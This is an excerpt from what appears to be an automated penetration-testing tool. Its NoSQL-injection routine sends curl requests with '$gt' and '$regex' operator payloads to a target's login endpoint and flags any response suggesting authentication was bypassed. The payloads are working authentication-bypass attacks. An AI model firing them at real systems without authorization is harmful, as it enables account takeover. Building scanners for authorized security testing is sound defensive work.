...
class InjectionTools(BaseTool):
    ...
    async def _run_nosqli(self, session_id: str, target: str, **kwargs) -> Dict[str, Any]:
        ...
        cmd_gt = f"curl -s -w '\\n%{{http_code}}' -X POST {login_url} -H 'Content-Type: application/json' -d '{{\"username\":{{\"$gt\":\"\"}},\"password\":{{\"$gt\":\"\"}}}}'"
        result_gt = await self._execute(cmd_gt, session_id, timeout=30)
        raw["nosql_gt"] = result_gt
        cmd_regex = f"curl -s -w '\\n%{{http_code}}' -X POST {login_url} -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":{{\"$regex\":\".*\"}}}}'"
        result_regex = await self._execute(cmd_regex, session_id, timeout=30)
        raw["nosql_regex"] = result_regex
        auth_indicators = ["token", "jwt", "access_token", "session", "auth", "cookie", "bearer"]
        for test_name, result in [("$gt", result_gt), ("$regex", result_regex)]:
            if result.get("returncode") == 0:
                ...
                if status_code in ["200", "201", "204"] or any(ind in body_lower for ind in auth_indicators):
                    findings.append(Finding(
                        session_id=session_id, attack_type="nosql_injection", confidence=0.85,
                        endpoint=login_url,
                        evidence=f"NoSQL operator injection ({test_name}) may have bypassed authentication (status={status_code})",
                        status="confirmed", cvss_score=9.8, severity="critical",
